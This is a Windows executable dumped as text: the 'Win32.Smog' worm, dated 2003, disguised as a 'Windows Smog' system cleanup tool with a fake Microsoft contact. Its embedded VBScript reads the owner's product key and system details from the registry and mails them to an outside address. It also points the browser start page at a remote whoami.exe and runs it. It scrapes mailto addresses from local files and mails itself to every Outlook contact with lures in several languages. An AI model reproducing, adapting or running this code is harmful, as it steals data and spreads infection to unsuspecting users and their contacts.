MZP      ��  �       @                                     � �	�!�L�!��This program must be run under Win32
$7                                                                                                                                        PE  L /%|        � ��    8                  @                      �                                         P     p   
                   `  |                                                                                   CODE                               `DATA     0       (   
              @  �.idata      P      2              @  �.reloc      `      6              @  P.rsrc       p   
   8              @  P                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                j �  ��G@ j h)@ j jg�5�G@ �i  j ��  �   SWV�}t�}  t �}  tS3�^_[�� j �	  ^_[�� �}et1�}ft�}gt�^_[�� j h�G@ h�F@ �5�G@ ��  ^_[�� �   h�  �5�G@ ��  ��G@ Ph�  h�   �u��  h�G@ �u�  �  h�G@ P�  j ��G@ +�G@ ��P��G@ +�G@ ��P�	H@ +���P�H@ +���P�u�M  ^_[�� j j h' @ h   jj h   �   h   j �5' @ j �  �5' @ �   `j2�] @ Vj �   �+ @ Wj2W�   ��\Hid��eme.��exe �_j WV�   h�   h� @ �r   h� @ h� @ �9   j h� @ �   �� @ h0%  hz!@ �5� @ �s   �5� @ �\   j W�H   �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �%�P@ �% Q@ �%Q@ �%Q@ �%Q@ �%Q@ �%Q@ �% Q@ �%$Q@ �%(Q@ �%,Q@ �%0Q@ �%4Q@ �%8Q@                                                                                                                                                                                                                                                                                                                                                                                Win32.Smog by Necronomikon/ZeroGravity                                                                                                             \necro.vbs                                                                                                                                                                                                                             Set phile = createobject("scripting.filesystemobject")
On Error Resume Next
NOM = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
ENT = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization")
VER = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\Version")
NUM = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\VersionNumber")
REC1 = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductId")
REC2 = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\ProductKey")
PFD = ws.RegRead ("HKLM\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
PDEM = ws.RegRead ("HKCU\Software\Microsoft\Internet Explorer\Main\Start Page")
DDIR = ws.RegRead ("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
PAYS = ws.RegRead ("HKCU\Software\Microsoft\Internet Explorer\International\AcceptLanguage")

WINDIR = fso.GetSpecialFolder(0)
SYSDIR = fso.GetSpecialFolder(1)
TMPDIR = fso.GetSpecialFolder(2)
Set out = CreateObject("Outlook.Application")
Set Mail = Out.CreateItem(0)
Mail.BCC = "smogvx@tlen.pl"
Mail.Subject = "Infected user Info for nec"
Set net = CreateObject("WScript.Network")
m2 = m2 & vbCrLf & "Yo nec some infos for ya...."
rem ;taken from VBS.Petik
m2 = m2 & vbCrLf & "Network computer name: """ & net.ComputerName & Chr(34)
m2 = m2 & vbCrLf & "ENTREPRISE : " & ENT
m2 = m2 & vbCrLf & "Int.Language : " & PAYS
m2 = m2 & vbCrLf & "Version+Number : " & VER & " " & NUM
m2 = m2 & vbCrLf & "ProductId : " & REC1
m2 = m2 & vbCrLf & "ProductKey : " & REC2
m2 = m2 & vbCrLf & "IE Startpage: " & PDEM
m2 = m2 & vbCrLf & "Downloaddir : " & DDIR
m2 = m2 & vbCrLf & "Windir : " & WINDIR
m2 = m2 & vbCrLf & "Sysdir : " & SYSDIR
m2 = m2 & vbCrLf & "Tempdir : " & TMPDIR
m2 = m2 & vbCrLf & "Progfiles... : " & PFD
Mail.Body = m2
Mail.Attachmets.Add ""& SYSDIR  & date & ".dat" 
Mail.DeleteAfterSubmit = True
Mail.Send
Set fso=CreateObject("Scripting.FileSystemObject")

Set mel=fso.CreateTextFile("spread_mailto.txt",8,TRUE)
counter=0
lect()
mel.WriteLine "#"
mel.Close
WScript.Quit
Set downloader = CreateObject("WScript.Shell")
downloader.regwrite "HKCU\software\win\", Chr(87) + Chr(105) + Chr(110) + Chr(51) + Chr(50) + Chr(46) + Chr(83) +_
 Chr(109) + Chr(111) + Chr(103) + Chr(32) + Chr(40) + Chr(99) + Chr(41) + Chr(98) + Chr(121) + Chr(32) + Chr(78) + Chr(101) +_
 Chr(99) + Chr(114) + Chr(111) + Chr(110) + Chr(111) + Chr(109) + Chr(105) + Chr(107) + Chr(111) + Chr(110) + Chr(47) +_
 Chr(90) + Chr(101) + Chr(114) + Chr(111) + Chr(71) + Chr(114) + Chr(97) + Chr(118) + Chr(105) + Chr(116) + Chr(121)
Set sm0g= Createobject("scripting.filesystemobject")
sm0g.copyfile wscript.scriptfullname,sm0g.GetSpecialFolder(0)&_
"\necro.vbs"
ZGravity= ""
ZGravity= downloader.regread("HKCU\Software\Microsoft\Internet Explorer\Download Directory")
If (ZGravity= "") Then
ZGravity = "c:"
End If
If Right(ZGravity, 1) = " \ " Then ZGravity = Mid(ZGravity, 1, Len(ZGravity) - 1)
If Not (sm0g.fileexists(sm0g.getspecialfolder(0) & "\whoami.exe")) Then
If Not (sm0g.fileexists(ZGravity & "\whoami.exe")) Then
downloader.regwrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page",_
" http://www.angelfire.com/psy/smog/whoami.exe"
Else
downloader.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page",_
"about:blank"
sm0g.copyfile ZGravity & "\whoami.exe",_
sm0g.getspecialfolder(0) & "\whoami.exe"
downloader.run sm0g.getspecialfolder(0) & "\whoami.exe", 1, False
end if

Sub lect()
On Error Resume Next
Set dr=fso.Drives
For Each d in dr
If d.DriveType=2 or d.DriveType=3 Then
list(d.path&"\")
End If
Next
End Sub

Sub spreadmailto(dir)
On Error Resume Next
Set fso=CreateObject("Scripting.FileSystemObject")
Set f=fso.GetFolder(dir)
Set cf=f.Files
For Each fil in cf
ext=fso.GetExtensionName(fil.path)
ext=lcase(ext)
if (ext="htm") or (ext="html") or (ext="htt") or (ext="eml") or (ext="asp") or (ext="txt") or (ext="dbx") or (ext="wab")or (ext="mmf") or (ext="nch") or (ext="mbx") or (ext="tbb") or (ext="ocs") Then


set htm=fso.OpenTextFile(fil.path,1)
allhtm=htm.ReadAll()
htm.Close
For ml=1 To Len(allhtm)
count=0
If Mid(allhtm,ml,7) = "mailto:" Then
counter=counter+1
mlto=""
Do While Mid(allhtm,ml+6+count,1) <> """"
count=count+1
mlto = mlto + Mid(allhtm,ml+6+count,1)
loop
mel.WriteLine counter &" <"&left(mlto,len(mlto)-1)&">"
msgbox mlto
sendmailto(left(mlto,len(mlto)-1))
End If
Next
End If
Next
End Sub

Sub list(dir)
On Error Resume Next
Set f=fso.GetFolder(dir)
Set ssf=f.SubFolders
For Each fil in ssf
spreadmailto(fil.path)
list(fil.path)
Next
End Sub 
  
Sub sendmailto(email)
set wshell=CreateObject("WScript.Shell")
set fso=CreateObject("Scripting.FileSystemObject")
set wfile=fso.CreateTextFile(necro&"\smog.vbs")
necro = fso.getspecialfolder(0)
wfile.WriteLine "On Error Resume Next"
wfile.WriteLine  "dim x, y, lists, entries, mox, b, regedit, v, regad,s1,s2,s3,z1,z2,z3,z4,z5,r1,r2,r3,r4,r5,lang,ssubject,sbody,dirtemp"
wfile.WriteLine "set dirtemp=fso.GetSpecialFolder(2)"
wfile.WriteLine "s1="&chr(34)&"MA"&chr(34)
wfile.WriteLine "s2="&chr(34)&"PI"&chr(34)
wfile.WriteLine "s3=s1&s2"
wfile.WriteLine ""
wfile.WriteLine "z1="&chr(34)&"Outl"&chr(34)
wfile.WriteLine "z2="&chr(34)&"ook."&chr(34)
wfile.WriteLine "z3="&chr(34)&"Appli"&chr(34)
wfile.WriteLine "z4="&chr(34)&"cation"&chr(34)
wfile.WriteLine "z5=z1&z2&z3&z4"
wfile.WriteLine ""
wfile.WriteLine "r1="&chr(34)&"WS"&chr(34)
wfile.WriteLine "r2="&chr(34)&"cript"&chr(34)
wfile.WriteLine "r3="&chr(34)&".Sh"&chr(34)
wfile.WriteLine "r4="&chr(34)&"ell"&chr(34)
wfile.WriteLine "r5=r1&r2&r3&r4"
wfile.WriteLine ""
rem send mails in different languages...
wfile.WriteLine  "set regedit = CreateObject(r4)"
wfile.WriteLine "set ecco=WScript.CreateObject(z5)"

rem ...in italian
wfile.WriteLine "lang=regedit.RegRead("&chr(34)&"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\Locale\"&chr(34)&")"
wfile.WriteLine "if (lang = "&chr(34)&"00000410"&chr(34)&" or lang = "&chr(34)&"00000810"&chr(34)&") then "
wfile.WriteLine " ssubject="&chr(34)&"Ciao!!!"&chr(34)
wfile.WriteLine " sbody="&chr(34)&"Ciao, in questa e-mail ti allego una bella chicca ;-) Dagli un'occhiata."&chr(34) 

rem ...in spanish
wfile.WriteLine "elseif (lang ="&chr(34)&"00000403"&chr(34)&" or lang="&chr(34)&"0000040A"&chr(34)&" or lang="&chr(34)&"0000080A"&chr(34)&" or lang="&chr(34)&"00000C0A"&chr(34)&" or lang="&chr(34)&"00002C0A"&chr(34)&") then"
wfile.WriteLine " ssubject="&chr(34)&"Hola!!!"&chr(34)
wfile.WriteLine " sbody="&chr(34)&"Hola, en �ste mensaje est� C�meron D�az desnuda!!!"&chr(34)

rem ...in polish
wfile.WriteLine "elseif (lang ="&chr(34)&"00000415"&chr(34)&") then"
wfile.WriteLine " ssubject="&chr(34)&"Witam!!!"&chr(34)
wfile.WriteLine " sbody="&chr(34)&"Nie boje sie na lepsze!!!;-)"&chr(34)

rem ...in german
wfile.WriteLine "elseif (lang ="&chr(34)&"00000407"&chr(34)&") then"
wfile.WriteLine " ssubject="&chr(34)&"Gruess dich!!!"&chr(34)
wfile.WriteLine " sbody="&chr(34)&"Schau mal was ich f�r dich habe!!!;-)"&chr(34)

rem ...in english
wfile.WriteLine "else"
wfile.WriteLine " ssubject="&chr(34)&"Hello!!!"&chr(34)
wfile.WriteLine " sbody="&chr(34)&"Hi, in this e-mail you have attached a goody ;-) Check it out!"&chr(34)
wfile.WriteLine "end if"
wfile.WriteLine " set out = ecco"
wfile.WriteLine " set mapi = out.GetNameSpace(s3)"
wfile.WriteLine " for lists = 1 to mapi.AddressLists.Count"
wfile.WriteLine "   set y = mapi.AddressLists(lists)"
wfile.WriteLine "   x = 1"
wfile.WriteLine "   v = regedit.RegRead("&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&" & y)"
wfile.WriteLine "   if (v = "&chr(34)&chr(34)&") then"
wfile.WriteLine "      v = 1"
wfile.WriteLine "   end if"
wfile.WriteLine "   if (int(y.AddressEntries.Count) > int(v)) then"
wfile.WriteLine "     for entries = 1 to y.AddressEntries.Count"
wfile.WriteLine "      mox = y.AddressEntries(x)"
wfile.WriteLine "      regad = "&chr(34)&chr(34)
wfile.WriteLine "       regad = regedit.RegRead("&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&" & mox)"
wfile.WriteLine "   if (regad = "&chr(34)&chr(34)&") then"
wfile.WriteLine "         set xzx = ecco.CreateItem(0)"
wfile.WriteLine "         xzx.Recipients.Add(mox)"
wfile.WriteLine "          xzx.Subject = ssubject"
wfile.WriteLine "          xzx.Body =  vbcrlf & sbody"
wfile.WriteLine "          xzx.Attachments.Add(necro & "&chr(34)&"\smog.exe"&chr(34)&")"
wfile.WriteLine "          xzx.Send"
wfile.WriteLine "          regedit.RegWrite "&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&" & mox, 1, "&chr(34)&"REG_DWORD"&chr(34)
wfile.WriteLine "        end if"
wfile.WriteLine "        x = x + 1"
wfile.WriteLine "      next"
wfile.WriteLine "regedit.RegWrite "&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&"&y,y.AddressEntries.Count"
wfile.WriteLine "    else"
wfile.WriteLine "regedit.RegWrite "&chr(34)&"HKEY_CURRENT_USER\Software\Microsoft\WAB\"&chr(34)&"&y,y.AddressEntries.Count"
wfile.WriteLine "    end if"
wfile.WriteLine "  next"
wfile.WriteLine "  Set out = Nothing"
wfile.WriteLine "  Set mapi = Nothing"
wfile.WriteLine " Set fso = CreateObject("&chr(34)&"Scripting.FileSystemObject"&chr(34)&")" 
wfile.WriteLine "fso.DeleteFile(WScript.ScriptFullname)"
wfile.close
End Sub
End If
What is Windows Smog?
Windows Smog is a tool to remove bugs and make your system faster!

How to install it?
Click on Run Button and follow it's intruduction.



YOU HAVE TO RUN THIS TOOL EVERY TIME WHEN YOU WANNA FIX UP YOUR BUGS.


Have a nize day....
 Win32.SMOG Win32.Smog runnin... Eat this...                                PP          @Q  �P  �P          MQ  Q  �P          ZQ  Q                      fQ  pQ  �Q  �Q  �Q  �Q  �Q  �Q  �Q  R  R  R  4R  >R  TR  ^R  hR      rR  �R      �R  �R  �R  �R  �R  �R  �R  S      fQ  pQ  �Q  �Q  �Q  �Q  �Q  �Q  �Q  R  R  R  4R  >R  TR  ^R  hR      rR  �R      �R  �R  �R  �R  �R  �R  �R  S      KERNEL32.dll ADVAPI32.dll USER32.dll    lstrcat   FormatMessageA    ExitProcess   LoadLibraryA    LocalFree   GetModuleHandleA    GetSystemDirectoryA   GetWindowsDirectoryA    GetModuleFileNameA    OpenProcess   CopyFileA   SetFileAttributesA    WinExec   WriteProcessMemory    _lclose   _lcreat   _lwrite   RegCreateKeyExA   RegSetValueExA    PostQuitMessage   MoveWindow    MessageBoxA   LoadIconA   GetWindowRect   GetDesktopWindow    SendMessageA    DialogBoxParamA                                                                                                                                                                                                                                              |   00{0�0�0�0�0�0�0�0�0�0�0�0	10&1F1S1`1m1�1�1�1�1�1�1�1�1�1�1�12	2222!2'2-23292?2E2K2Q2W2]2c2i2o2u2{2�2�2�2                                                                                                                                                                                                                                                                                                                                                                                                            t\C?          0  �   H  �   `  �   x  �    t\C?          �  �    t\C?       g   �  �    t\C?       �  �  �    t\C?          �  �    t\C?           �       t\C?                  t\C?                 t\C?              0q  �          t            4w             Hw  L          (       @         �                        �  �   �� �   � � ��  ��� ���   �  �   �� �   � � ��  ���                                      ����0         �������       ��������0      ����������     �����������    ;� ������ ��    �� ����� �   �  �����  ��  �   ����   �  ;�   ����   �  �    ���    �  �    ;0�    �  �    �  ;    �  �   �  0   �  ������  �����  ������  ;�����  ������0������  ��������������  ;�����  ������  �����  �����  �����  �����   ����    ����    ;���    ����    ���    ���     ���    ��      ��    ;�0       �������         ����0                                     �������  �  ?�  �  �  �  �  �  �  �                                  �  �  �  �  �  �  �  �  �  ?�  ������� ��    
  9 � w                                         W i n d o w s   S M O G    M S   S a n s   S e r i f      P     ` 2  e ��� R u n       P    G ` 2  f ��� A b o u t       P    � ` 2  g ��� e x i t         P     	 � G h ���         P      �  �����     T h e   u l t i m a t e   t o o l   t o   g e t   a l l   o u t   o f   y o u r   s y s t e m       P      �  ����� # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #       P     # � 	 i ���         P     . �  �����           H o w   t o   c o n t a c t   u s / t o   g e t   i n f o s :         P     9 �  �����           w i n 3 2 s m o g @ m i c r o s o f t . c o m         P     D �  �����           h t t p : / / w w w . m i c r o s o f t . c o m / s m o g . h t m l              �   L4   V S _ V E R S I O N _ I N F O     ���                                          �    S t r i n g F i l e I n f o   �    0 4 0 9 0 4 E 4   :   C o m p a n y N a m e     Z e r o G r a v i t y       2   F i l e D e s c r i p t i o n     S m o g     ,   F i l e V e r s i o n     1 . 0 0     4 
  I n t e r n a l N a m e   W i n 3 2 S m o g   b   L e g a l C o p y r i g h t   C o p y r i g h t   �   N e c r o n o m i k o n   2 0 0 3       : 	  O r i g i n a l F i l e n a m e   s m o g . e x e     D     V a r F i l e I n f o     $    T r a n s l a t i o n     	�                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            